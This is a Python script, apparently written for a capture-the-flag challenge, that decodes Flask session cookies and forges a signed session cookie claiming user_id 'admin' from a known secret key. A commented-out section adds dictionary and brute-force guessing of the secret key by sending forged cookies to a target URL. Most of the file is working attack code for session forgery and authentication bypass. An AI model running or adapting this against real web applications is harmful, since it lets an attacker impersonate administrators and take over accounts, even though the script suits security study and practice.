from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
from base64 import b64decode
from itsdangerous import base64_decode
import zlib
import itertools
import string
import requests

# https://github.com/Paradoxis/Flask-Unsign also


class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)


def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)


def decode(cookie):
    """Decode a Flask cookie."""
    try:
        compressed = False
        payload = cookie

        if payload.startswith('.'):
            compressed = True
            payload = payload[1:]

        data = payload.split(".")[0]

        data = base64_decode(data)
        if compressed:
            data = zlib.decompress(data)

        return data.decode("utf-8")
    except Exception as e:
        return "[Decoding error: are you sure this was a Flask session cookie? {}]".format(e)


# works well with straight cookie
session = ".eJwljjsKw0AMBe-i2oV29VnLlwnSapcYUtlxFXL3GFK8gYEp3gce8xjnE7b3cY0FHnvCBkLq072J1JBWunKpNTppeDKGkNf0LChZa4-GPkM7GTNOGVxRDWlt90iRRTVnMUrt6YReFIPQiHSGSbDZLYIrTxt3dHPAAtc5jv8Zf-19wPcH9HEvbA.XHsL3A.uFut4_OOZyJL-hUfAMPEKnHlw5Y"
print(decode(session))
cookie = encodeFlaskCookie("gigem", {"_fresh":True,"_id":"536afaa7552b571c64122bc36bad40b53a2dad105d22cb70afb6c39440f5e4206903870383604566df193d6cda30a160b309336fb95b4990935084f9e3d6f9ee","user_id":"admin"})
print(cookie)

# sk = "test"
# sessionDict = {u'Hello':'World'}
# cookie = encodeFlaskCookie(sk, sessionDict)
# print(cookie)

# works better with signed cookies being read
# print(decodeFlaskCookie(sk, cookie))


"""
# dictionary guessing
sessionDict = {u'Hello':'World'}
wordlist = "words.txt"
url = ""

with open(wordlist) as f:
	for guess in f:
		res = encodeFlaskCookie(guess, sessionDict)
		# print(res)
		r = requests.get(url, cookies={"session":res})


# brute force
sessionDict = {u'Hello':'World'}
max_length = 2
alphabet = "abc"
url = ""

for i in range(1, max_length+1):
	for g in itertools.product(alphabet, repeat=i):
		guess = "".join(g)
		res = encodeFlaskCookie(guess, sessionDict)
		#print(res)
		r = requests.get(url, cookies={"session":res})
"""